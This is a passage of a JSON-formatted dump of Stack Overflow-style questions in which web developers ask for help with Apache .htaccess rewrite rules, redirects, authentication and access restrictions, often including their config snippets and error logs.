pc version","body":"<p>I am trying to redirect from the android version to the pc version, with this rule:</p>\n\n<pre><code>http://example.com/android/categories\n\n\n\n     RewriteCond %{HTTP_USER_AGENT} !^Android [NC]\nRewriteCond %{REQUEST_URI} !^categories$ [NC]\nRewriteRule categories$ /categories [L,R,QSA]\n</code></pre>\n\n<p>problem is that the android version goes inside the rewrite condition, even when i tell it not to go if the user agent is either iphone and android.. </p>\n\n<p>Why does the android version read that rule?</p>\n\n<p>And in this example:</p>\n\n<pre><code> RewriteCond %{HTTP_USER_AGENT} \"!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)\" [NC]\nRewriteRule hot$ /hot-apps  [L,R,QSA]\nRewriteRule android/news$ /news  [L,R,QSA]\n</code></pre>\n\n<p>The first rewrite rule works..while the next one doesnt..</p>\n\n<p>I also did this:</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} \"!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)\" [NC]\nRewriteRule iphone/contact$ /contact [L,R,QSA]\n</code></pre>\n\n<p>This doesnt work too:</p>\n\n<pre><code> RewriteCond %{HTTP_USER_AGENT} \"!(android|blackberry|googlebot-mobile|iemobile|ipad|iphone|ipod|opera mobile|palmos|webos)\" [NC]\nRewriteCond %{REQUEST_URI} !^/android/ [NC]\nRewriteRule news$ /news  [L,R,QSA]\n</code></pre>\n\n<p>But still doesnt work properly?</p>\n"},{"tags":[".htaccess","url-rewriting","query-string","ascii"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13181092,"title":"ASCII Characters in Links Producing 404 Errors","body":"<p>I used to have a query string ?q= in all my urls. I now have these urls redirecting to the alias name.</p>\n\n<p><code>RewriteRule ^(.*)$ index.php?q=$1 [L,NC]\nRewriteCond %{QUERY_STRING} ^q=(.*)$ [NC]\nRewriteRule ^$(.*) /%1? [R=301,L,NE]</code></p>\n\n<p>Unfortunately other websites link to pages on my website in this manner www.example.com/%3Fq%3Dfaqs. I changed over all the links on my site to absolute but somehow google has indexed hundreds of pages that look like www.example.com/%3Fq%3Dfaqs?q=contact or www.example.com/%3Fq%3Dfaqs%3Fq%3Dcontact.\nIs there a way I can rewrite these ASCII codes back to the symbols using htaccess or some other method?</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":39,"score":0,"question_id":12842569,"title":"rewrite with htaccess (i tried to use solutions from other topics)","body":"<p>I use wordpress 3.4.2.<br>\nI tried to change url with htaccess, but i have next problem:<br>\nRewriteRule ^order/([0-9])/$ index.php?pagename=order&amp;type=$1 - works!<br>\nRewriteRule ^order/([a-z])/$ index.php?pagename=order&amp;type=$1 - \"not found\" or redirects on other page(example)!</p>\n\n<p>example:<br>\nif I enter www.mywebsite.com/order/a/, it'll be redirecting at page www.mywebsite.com/about/ \n(if it exists or \"not found\").</p>\n\n<p>P.S. I'm a newcomer, so don't be angry.</p>\n\n<p>P.S. Solved.</p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":29,"score":0,"question_id":13268355,"title":"htaccess allow only right domain name in ip dedicated website","body":"<p>i'm trying to allow only my domain name to view my website...\ni have a dedicated ip and Anyone can basically set your domain to my ip, It creates duplicate content of my website.</p>\n"},{"tags":["php",".htaccess"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13269692,"title":"limit GET using .htaccess in a KISSMVC php based site","body":"<p>I have a KISSMVC php based site with the following .htaccess to allow only authenticated users to see the site</p>\n\n<pre><code>RewriteEngine On\n\nRewriteBase /myphpsite/\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\n# Protect app files\nRewriteRule ^((app|system|scripts).*)$ index.php/$1 [L]\n\nAuthName \"Please enter your username and password\"\nAuthType Basic\n&lt;Limit GET&gt;\nrequire user THEUSERNAME\n&lt;/Limit&gt;\n</code></pre>\n\n<p>This works with no problem.</p>\n\n<p>The problem is that I want to allow clients to retrieve a value from the site with no authentication. This value is obtained through the index.php function because it is calculated per client, plus there is no folder structure where these values are stored.</p>\n\n<p>as an example this URL should not prompt:</p>\n\n<pre><code>http://fancywebsite.com/myphpsite/index.php/inventory/hash/variable\n</code></pre>\n\n<p>but this one should still be prompting:</p>\n\n<pre><code>http://fancywebsite.com/myphpsite\n</code></pre>\n\n<p>If I could somehow specify in the .htaccess file to bypass or satisfy the authentication when the requested URL contains \"index.php/inventory/hash\" that would be perfect.</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":28,"score":-1,"question_id":12675963,"title":".htaccess redirection to avoid 404","body":"<p>I recently make changes in my CMS, which cause lots of 404 error in google webmaster. Currently 404 not found URL are</p>\n\n<p><a href=\"http://pukhtoogle.com/gallery/postcard.img707.htm\" rel=\"nofollow\">http://pukhtoogle.com/gallery/postcard.img707.htm</a></p>\n\n<p>Whereas the working URL is</p>\n\n<p><a href=\"http://pukhtoogle.com/gallery/img707.htm\" rel=\"nofollow\">http://pukhtoogle.com/gallery/img707.htm</a></p>\n\n<p>I want to exclude postcard from the URL via .htaccess, please suggest a line to replace it, following code shows my existing file.</p>\n\n<pre><code>RewriteEngine On \n\n#RewriteBase /\nRewriteRule ^sitemap.xml$ google.php\nRewriteRule ^cat-(.*)-([0-9]+)\\.htm$ categories.php?cat_id=$2&amp;%{QUERY_STRING}\nRewriteRule ^cat\\.htm$ categories.php?%{QUERY_STRING}\n\n#Mod_bmollet : Image name in URL\nRewriteRule ^img-(.*)-([0-9]+)\\.htm$ details.php?image_id=$2&amp;%{QUERY_STRING}\nRewriteRule ^img([0-9]+)\\.search.htm$ details.php?image_id=$1&amp;%{QUERY_STRING}\nRewriteRule ^img([0-9]+)\\.lightbox.htm$ details.php?image_id=$1&amp;%{QUERY_STRING}\nRewriteRule ^img([0-9]+)\\.htm$ details.php?image_id=$1&amp;%{QUERY_STRING}\nRewriteRule ^img([0-9]+)\\.([a-zA-Z0-9]+)\\.htm$ details.php?image_id=$1&amp;mode=$2&amp;%        {QUERY_STRING}\n\n\n#Mod_bmollet : This is to make search function work ( redirect links from search results )\nRewriteRule ^search\\.htm$ search.php?%{QUERY_STRING}\nRewriteRule ^search\\.([0-9]+)\\.htm$ search.php?page=$1&amp;%{QUERY_STRING}\nRewriteRule ^lightbox\\.htm$ lightbox.php?%{QUERY_STRING}\nRewriteRule ^lightbox\\.([0-9]+)\\.htm$ lightbox.php?page=$1&amp;%{QUERY_STRING}\n</code></pre>\n"},{"tags":["performance",".htaccess","optimization","cdn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":9,"score":-1,"question_id":13269144,"title":"Using a not real CDN for images is still useful?","body":"<p>I have a site with heavy traffic and I've read that moving images on another server could improve performances, best if this second server is on a CDN.</p>\n\n<p>www.mysite.com ---> web site\nimages.mysite.com ---> server for images</p>\n\n<p>if images aren't really on a different server but the images.mysite.com is just a subdirectory on  the same server, same web site, but handled only with htaccess redirects... is this still useful to split requests to server and improve speed for browser?</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":271,"score":0,"question_id":12140559,"title":"Error with .htaccess and mod_rewrite","body":"<p>I'm trying to host a php based application with the following .htaccess values.</p>\n\n<pre><code>Options +FollowSymLinks\nOptions -Indexes\nDirectoryIndex index.php\n\nRewriteEngine On\nRewriteBase /easydeposit\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p>However, I keep facing the following two errors,</p>\n\n<pre><code>[access_compat:error] [pid 25330:tid 27] AH01797: client denied by server configuration: /home/abc/opt/apache/htdocs/xyz/system/\n[access_compat:error] [pid 25330:tid 27]  AH01797: client denied by server configuration: /home/abc/opt/apache/htdocs/xyz/private/\n[access_compat:error] [pid 25330:tid 27] AH01797: client denied by server configuration: /home/abc/opt/apache/htdocs/xyz/application/\n[authz_core:error] [pid 25330:tid 27]  AH01630: client denied by server configuration: /home/abc/opt/apache/htdocs/xyz/.htaccess\n</code></pre>\n\n<p>I'm not sure why this is happening. Any help is appreciated.</p>\n"},{"tags":["windows","apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":8,"score":0,"question_id":13267003,"title":".htaccess files being ignored in site outside the apache webroot","body":"<p><strong>Setup</strong>\nI'm running xampp on Windows XP.\nI recently had to setup a site in a folder structure outside my webroot.\nAt first I got permissions error when I tried to browser to the site, this was fixed by adding  a Directory entry to the httpd-vhosts.conf  to \"Allow from All\" to the root of the new site.</p>\n\n<p><strong>Problem</strong>\nThe problem now is that .htaccess files are ignored completely in this new folder, however they work fine for my other sites?</p>\n\n<p>Please help :)</p>\n\n<p>J</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13264690,"title":".htaccess redirect non-existing pages only, keeping the token","body":"<p>I want to redirect </p>\n\n<blockquote>\n  <p>www.domain.com/abc</p>\n</blockquote>\n\n<p>to </p>\n\n<blockquote>\n  <p>www.domain.com/index.php?a=abc</p>\n</blockquote>\n\n<p>only if the folder abc doesn't already exist. \nHow should I write the .htaccess file?</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":11885760,"title":"Page getting loaded multiple times when mod_rewrite enabled (and css missing)","body":"<p>I have enabled <code>mod_rewrite</code> and am using a <code>.htaccess</code> file to pass all requests through <code>index.php</code>.</p>\n\n<p>If I visit the URL's </p>\n\n<pre><code>http://localhost/mysite\n\nhttp://localhost/mysite/abc\n</code></pre>\n\n<p>the page loads once.</p>\n\n<p>However, if I add extra parts to the path, the page loads three times and my css files dont get included:</p>\n\n<pre><code>http://localhost/mysite/abc/xyz\n\nhttp://localhost/mysite/abc/xyz/ttt\n</code></pre>\n\n<p>etc...</p>\n\n<p>All cause the page to load three times. I can see this as I have a breakpoint set in <code>index.php</code> in <strong>Eclipse</strong>.</p>\n\n<p>Here is my <code>.htaccess</code> file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n\n  # Block access to \"hidden\" directories whose names begin with a period. \n  # Files whose names begin with a period are protected by the FilesMatch directive\n  # above.\n  RewriteRule \"(^|/)\\.\" - [F]\n\n  # Pass all requests not referring directly to files in the filesystem to\n  # index.php. Clean URLs are handled in drupal_environment_initialize().\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteRule ^ index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Any ideas why the page is getting loaded multiple times and the css is missing?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13263510,"title":"Is it possible, using htaccess to load a CSS file for any file opened within that directory by default?","body":"<p>I am hoping to have each image file opened within a certain directory ('example.com/image.jpg') to load a css file so I can make the image load at 100% width.</p>\n\n<p><strong>Edit</strong>: To be clear, I am aware that I would have to do this by loading an HTML file with CSS inside, my real question is how do I target the files inside with the CSS styling, instead of the directory itself. </p>\n"},{"tags":["apache",".htaccess","redirect","rewrite","cdn"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":13263141,"title":"htacess redirect a specific extension to subdomain","body":"<p><br><br>I wish to redirect/rewrite a specific extension (mp3) in a specific folder to a subdomain which uses a CDN.<br><br>To make things more clear I want just the mp3 extension in folder 'compositions' to a subdomain only when someone tries to download the mp3 like<br></p>\n\n<pre><code>http://www.example.com/compositions/interception.mp3\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://sub.example.com/interception.mp3 (subdomain on push zone CDN)\n</code></pre>\n\n<p>Any suggestions?</p>\n\n<p>Best regards</p>\n"},{"tags":["apache",".htaccess","magento"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":503,"score":2,"question_id":9626562,"title":"Any way to make the Magento home page use a static HTML page?","body":"<p>Is there any way to have the Magento home page be a static html page?  </p>\n\n<p>Under heavy load situations Magento (even with Varnish, APC, Fooman, block caching, etc) can be slow.  However, I would like the home page to be as fast as possible.  One way to do that is to just use a static HTML page.</p>\n\n<p>Is this possible?</p>\n"},{"tags":["php","html","apache",".htaccess","mamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13260492,"title":"htaccess and php files - treating all files as php?","body":"<p>I have a website on localhost, latest MAMP build.\nThe subfolder is test2.</p>\n\n<p>This is its .htaccess:</p>\n\n<pre><code>DefaultType text/html\nDefaultType application/x-httpd-php\n</code></pre>\n\n<p>Is this the correct way to ensure files get treated as both HTML and PHP?</p>\n"},{"tags":["regex",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13251500,"title":"Deny access to all .php files except root index.php","body":"<p>This is essentially a duplicate of <a href=\"http://stackoverflow.com/questions/1340001/deny-direct-access-to-all-php-files-except-index-php/1607587\">this question</a> but with one caveat: I want to deny direct access to all files named index.php below the root directory.</p>\n\n<p>Allow:\n/index.php</p>\n\n<p>Deny:\n/application/views/settings/index.php</p>\n\n<p>I know I can use PHP to look for a defined constant or variable, but is it possible to achieve this using .htaccess only? This is what I have so far:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>##\n# Disallow direct access to files.\n#\n\n&lt;FilesMatch \"^(.*)\\.php$\"&gt;\n    Order Deny,Allow\n    Deny from all\n&lt;/FilesMatch&gt;\n\n&lt;FilesMatch \"^index\\.php$\"&gt;\n    Order Allow,Deny\n    Allow from all\n&lt;/FilesMatch&gt;\n</code></pre>\n\n<p>Adding a third <code>FilesMatch</code> to deny <code>\"^(.*)/index/index\\.php$\"</code> does not work.</p>\n"},{"tags":["php",".htaccess","rewrite"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":955,"score":2,"question_id":5437019,"title":"htaccess rewrite if redirected file exists","body":"<p>The problem: Some html pages of php equivalents (apple.html, apple.php; orange.html, orange.php), but not all do (grapes.html).</p>\n\n<p>The goal: If the php version exists, rewrite, otherwise keep it the html version.</p>\n\n<p>I have:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteRule ^(.*)\\.html$ /$1.php [R]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)\\.php$ /$1.html [R]\n</code></pre>\n\n<p>Interesting issues:</p>\n\n<p>If I don't put / in front of $1.php then I end up with: site.com/document/root/path (ie: site.com/home/user/www/file.php)</p>\n\n<p>When calling the second RewriteRule, I get <a href=\"http://site.com/http:/site.com/page.html\" rel=\"nofollow\">http://site.com/http:/site.com/page.html</a> and it tells me there were too many redirects. Notice how there is only one / in the second http.</p>\n\n<p>I've made some progress, I added RewriteBase / and removed the / before the $1, but I still get the too many redirects error (the web page at site.com/page.html has resulted in too many redirects. Clearing your cookies for this site or allowing third-party cookies may fix the problem. If not, it is possibly a server configuration issue and not a problem with your computer).</p>\n\n<p>It seems like if I just rewrite html -> php -> html I get the same error. So it looks like the logic is working, but that sort of logic isn't allowed. I can't think of any other way I could see if a \"php version\" of a file exists? The only way I can think of is do something similar to:</p>\n\n<pre><code>RewriteCond ^(.*)\\.html$ $1.php -f\nRewriteRule ^(.*)\\.html$ $1.php [R]\n</code></pre>\n\n<p>Unfortunately that doesn't quite work (I'm guessing because it has three segments on the condition line). I'm trying to get the filename without the extension, then say if filename.php is a file, rewrite page.html to page.php</p>\n"},{"tags":["php",".htaccess","mod-rewrite","friendly-url"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1491,"score":0,"question_id":5205456,"title":".htaccess mod_rewrite > 500 Internal Server Error","body":"<p>I am new with .htaccess, so this might be a dummy question :).</p>\n\n<p>My original link is:</p>\n\n<pre><code>http://example.com/CareerDays/index.php?u_type=admin\n</code></pre>\n\n<p>And I'm trying to make it look like this:</p>\n\n<pre><code>http://example.com/v/admin\n</code></pre>\n\n<p>The entire code looks like this:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^v/([^/]*)$ /CareerDays/index.php?u_type=$1 [L]\n</code></pre>\n\n<p>And I always get \"<strong>500 Internal Server Error</strong>\" :(</p>\n\n<p>Any suggestions ?</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":46,"score":2,"question_id":13258154,"title":"How do I strip part of a url?","body":"<p>How do I strip a part of the url? I do not know much about htaccess or apache.</p>\n\n<p>I would like to strip <code>www.mysite.com/page=services</code> to <code>www.mysite.com/services</code> for example.</p>\n\n<p>What exactly do I need to put in the .htaccess file in order to achieve this, and would that work for other pages as well?</p>\n\n<p>Thanks.</p>\n"},{"tags":[".htaccess","background","styles"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":13257310,"title":"Background disappear .htaccess","body":"<p>I just finished my <code>.htaccess</code> file, only rewriting to a nicer URL, but with no reason the background disappeared. If I access with the ugly old URL the background is there.</p>\n\n<pre><code>&lt;html...\n...\n&lt;style type='text/css'&gt;\nbody { color:#FFF;background:#444 url(office_1.png); }\nbody { margin:0;padding:0; }\n&lt;/style&gt;\n&lt;/head&gt;\n</code></pre>\n\n<p>The <code>.htaccess</code>:</p>\n\n<pre><code>RewriteRule download/(.*)/u_id/(.*)/id/(.*)/n/(.*)$ download.php?on=$1&amp;u_id=$2&amp;id=$3&amp;n=$4\nRewriteRule download/(.*)/u_id/(.*)/id/(.*)/n/(.*)/$ download.php?on=$1&amp;u_id=$2&amp;id=$3&amp;n=$4\nRewriteRule download/(.*)/u/(.*)/id/(.*)/n/(.*)$ download.php?on=$1&amp;u_id=$2&amp;id=$3&amp;n=$4\nRewriteRule download/(.*)/u/(.*)/id/(.*)/n/(.*)/$ download.php?on=$1&amp;u_id=$2&amp;id=$3&amp;n=$4\n</code></pre>\n\n<p>The <code>.htaccess</code> rule is working, but why my background disappeared?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13257796,"title":"How to redirect domain.com to domain.com/blog/","body":"<p>I want to redirect my blog from <a href=\"http://designskew.com\" rel=\"nofollow\">http://designskew.com</a> to <a href=\"http://designskew.com/blog/\" rel=\"nofollow\">http://designskew.com/blog/</a>.</p>\n\n<p>I searched a lot of .htaccess redirection methods, but nothing worked. the designskew.com redirects always to google. Please help.</p>\n"},{"tags":[".htaccess","url","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13256700,"title":".htaccess doesn't rewrite url","body":"<p>I have the following link:</p>\n\n<p>my-domain.com/file/download.php?u_id=234fwe&amp;id=10&amp;name=universe-solar</p>\n\n<p>I want to rewrite to a SEO friendly url, but on my local and on my web server the .htaccess does not work !</p>\n\n<p>I have the following rule:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\n\nRewriteRule /download/u_id/(.*)/id/(.*)/name/(.*) download.php?u_id=$1&amp;id=$2&amp;name=$3\n</code></pre>\n\n<p>The new URL would be:</p>\n\n<p>my-domain.com/file/download/234fwe/id/10/universe-solar</p>\n\n<p>I'm using XAMPP, and I get Object not found Error, same on my web server (The URL is not valid).</p>\n\n<p>With .htaccess I denied my own IP to check if .htaccess is working. It's working, but the URL Rewrite doesn't.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13256409,"title":"Htaccess remove query string & redirect to product","body":"<p>I try to remove/redirect the query string from this link:</p>\n\n<p><a href=\"http://www.myDomain.com/detail/link-526.html?fb_action_ids=10151931158951677&amp;fb_action_types=og.likes&amp;fb_source=aggregation&amp;fb_aggregation_id=288381481237582\" rel=\"nofollow\">http://www.myDomain.com/detail/link-526.html?fb_action_ids=10151931158951677&amp;fb_action_types=og.likes&amp;fb_source=aggregation&amp;fb_aggregation_id=288381481237582</a></p>\n\n<p>To get this link: <a href=\"http://www.myDomain.com/detail/link-526.html\" rel=\"nofollow\">http://www.myDomain.com/detail/link-526.html</a></p>\n\n<p>Any help would be highly appreciate, thanks. </p>\n"},{"tags":["wordpress","apache",".htaccess","mod-rewrite","rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13256138,"title":".htaccess mod_rewrite domains to subdirectories (multiple sites)","body":"<p>I am attempting to rewrite domains to subdirectories in my hosting provider using .htaccess files since I do not have access to the Apache config files. In my web directory I have a Wordpress installation in the web root directory (/home/www/). Say the domain www.main-site.com points to this site. This WP install serves my main website.</p>\n\n<p>Then within this directory I have 3 other Wordpress installations which I host for customers. The file structure looks like (/home/www/example1, /home/www/example2, and /home/www/example3). Each of these websites will need it's own domain. (ie. www.example1.com, www.example2.com, www.example3.com).</p>\n\n<p>How can I use .htaccess files to ensure that when someone hits www.main-site.com, they land at my personal website, but when they navigate to www.example1.com, it points them to the subdirectory '/example1'?</p>\n\n<p>Currently, if I go to www.main-site.com everything works fine. Also, if I go to www.example1.com, it correctly forwards to my subdirectory site (I think that's set up automatically through my web hosting provider's admin panel.) But, once I click the first link to go to a different page on www.example1.com, instead of it looking like www.example1.com/new-page.html, it looks like www.main-site.com/example1/new-page.html. You can see it's pulling in my main site's url. I don't want this.</p>\n\n<p>Any thoughts?</p>\n\n<p>My code is below.</p>\n\n<p><strong>Code in my web root .htaccess file:</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p><strong>Code in my subdirectory's .htaccess file:</strong></p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /example1/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /example1/index.php [L]\n</code></pre>\n"},{"tags":[".htaccess","redirect","dns","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":27,"score":4,"question_id":13255553,"title":"Redirect whole domain","body":"<p>is it possible to redirect entire domain to another?</p>\n\n<p>I want it to redirect this way:</p>\n\n<pre><code>domain.com/something --&gt; www.domain.eu/something\nsub.domain.com/folder/file.type --&gt; sub.domain.eu/folder/file.type\nsuper.mega.sub.domain.com --&gt; super.mega.sub.domain.eu\n</code></pre>\n\n<p>(For any subdomain and anything after /.)</p>\n\n<p>I have access only to com domain.</p>\n\n<p>So far I have invented this code for .htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{HTTP_HOST} !^domain.com$ [OR]\nRewriteCond %{HTTP_HOST} ^domain.com$ [OR]\nRewriteCond %{HTTP_HOST} ^www.domain.com$\nRewriteRule (.*)$ http://www.domain.eu/$1 [R=permanent,L]\n</code></pre>\n\n<p>But it work like:</p>\n\n<pre><code>sub.domain.com/something --&gt; www.domain.eu/sub/something\n</code></pre>\n\n<p>So it is wrong.\nAny help please?\nThanks very much.</p>\n"},{"tags":["html",".htaccess","css-sprites"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13255258,"title":"Is there an effective way to serve specific thumbnail images to fetcher bots?","body":"<p>My site uses some aggressive caching techniques to keep requests to a minimum, among them being:</p>\n\n<ul>\n<li>.htaccess redirects to cached HTML files;</li>\n<li>Automatic merging of content images into CSS sprites. </li>\n</ul>\n\n<p>This works great for human traffic, but when an article is posted on Facebook, Pinterest, Google+, Reddit, etc the bot fails to find a suitable thumbnail since the page images are all big sprite JPEGs.</p>\n\n<p>One solution would be .htaccess rules that bypass the cache when a bot is making the request. Preferably without having to specifically name every possible bot user-agent. I am unsure how to accomplish that.</p>\n\n<p>Another solution would be to embed one good thumbnail image on every page that a bot would download but a real web browser would not. Any ideas how to accomplish that?</p>\n\n<p>Other suggestions are welcome. If all else fails I'll rework my script to exclude the first image of every post from the autosprites, but that will effectively double the number of image requests my poor overworked server must accomodate.</p>\n"},{"tags":["php","mysql",".htaccess","url","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13249846,"title":"Solved friendly URL in php? with other pages readmore in htaccess","body":"<p><strong>Hey There I Have 2 pages in selecting data from mysql frist page readmore.php to get posts with url from table posts sec page categories.php to get data  with caturl from table categories</strong>\nreadmore.php in htaccess \n        RewriteEngine On</p>\n\n<pre><code>    RewriteRule ^([a-zA-Z0-9-/]+).html$ readmore.php?url=$1\n    RewriteRule ^([a-zA-Z0-9-/]+).html/$ readmore.php?url=$1\n</code></pre>\n\n<p>categories.php in htaccess \n        RewriteEngine On</p>\n\n<pre><code>    RewriteRule ^([a-zA-Z0-9-/]+).html$ categories.php?caturl=$1\n    RewriteRule ^([a-zA-Z0-9-/]+).html/$ categories.php?caturl=$1\n</code></pre>\n\n<p><strong>My problem located when get caturl htaccess redirect me to readmore.php but i want redirect to categories.php !!</strong> </p>\n"},{"tags":[".htaccess","url","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":10,"score":1,"question_id":13253423,"title":"301 redirecting a rewritten URL","body":"<p>I'm attempting to redirect some rewritten URL's but while the redirect is working, it is including the original parameter before the rewrite.</p>\n\n<p>e.g. Redirect /used-cars.html <a href=\"http://www.odins.co.uk/our-cars.html\" rel=\"nofollow\">http://www.odins.co.uk/our-cars.html</a></p>\n\n<p>The rewritten URL is based upon the following structure: </p>\n\n<pre><code>http://www.domain.co.uk/pages/index.php?p=used-cars\n</code></pre>\n\n<p>However, what is happening is this:</p>\n\n<pre><code>http://www.domain.co.uk/our-cars.html?p=used-cars\n</code></pre>\n\n<p>The .htaccess file is as follows:</p>\n\n<pre><code>Options -Indexes\nOptions +FollowSymlinks\nRewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^odins.co.uk [NC]\nRewriteRule ^(.*)$ http://www.odins.co.uk/$1 [L,R=301]\nRewriteRule ^([^/]*)\\.html$ /pages/index.php?p=$1 [L]\nRewriteRule ^news/([^/]*)$ /pages/news/index.php?n=$1 [L]\n\nRedirect /used-cars.html http://www.domain.co.uk/our-cars.html\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n\n<p>Paul</p>\n"},{"tags":[".htaccess","drupal","drupal-7","drupal-modules"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13226665,"title":"I want to show a webpage which will be visible for specific country only","body":"<p>I want to show a webpage which will be visible in India only and for the rest of the world it should redirect to another page ,can anybody tell me how I can add this functionality using Drupal 7 ?</p>\n"},{"tags":["php","apache",".htaccess","cakephp","tomcat"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13246386,"title":"Using CakePHP on apache tomcat server","body":"<p>I have 2 platform for single application, one is in jsp and another is in php (I am using CakePHP).</p>\n\n<p><strong>What I want to do ?</strong></p>\n\n<p>Now we want to share session between two platform, in that case we need to use single web platform that can deploy php and jsp webpage.</p>\n\n<p><strong>What is the issue?</strong></p>\n\n<p>Now the issue is <code>.htaccess</code> file is not working on apache tomcat server, so we are not able to use CakePHP. Is there any way to use Using CakePHP on apache tomcat server ?</p>\n\n<p>I found this \n<a href=\"http://tuckey.org/urlrewrite/\" rel=\"nofollow\">http://tuckey.org/urlrewrite/</a> can solve my problem ? If yes how ?</p>\n\n<p>My <code>.htaccess</code> file  </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n   RewriteEngine on\n   RewriteRule    ^$ app/webroot/    [L]\n   RewriteRule    (.*) app/webroot/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Thanks In Advance</p>\n\n<p>Cheers!</p>\n"},{"tags":[".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13252330,"title":"htaccess \"Order Deny,Allow\"","body":"<p>I am using an <strong>htaccess</strong> file to deny access to all the files except <code>index.php</code>... earlier, I used the below code to do that...</p>\n\n<pre><code>Order Deny,Allow\nDeny from All\n\n&lt;Files \"index.php\"&gt;\n   Order Deny,Allow\n   allow from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>Then, I notice that for <code>http://www.domain.com/</code>, I am getting a 403 error, means <strong><em>forbidden</em></strong>... where <code>http://www.domain.com/index.php</code> is returning http status 200, means completely ok... to solve this problem I add the below code...</p>\n\n<pre><code>&lt;Files \".\"&gt;\n    Order Deny,Allow\n    allow from all\n&lt;/Files&gt;\n</code></pre>\n\n<p>And the following codes are working great for me... Now I detect that for <code>http://www.domain.com</code> 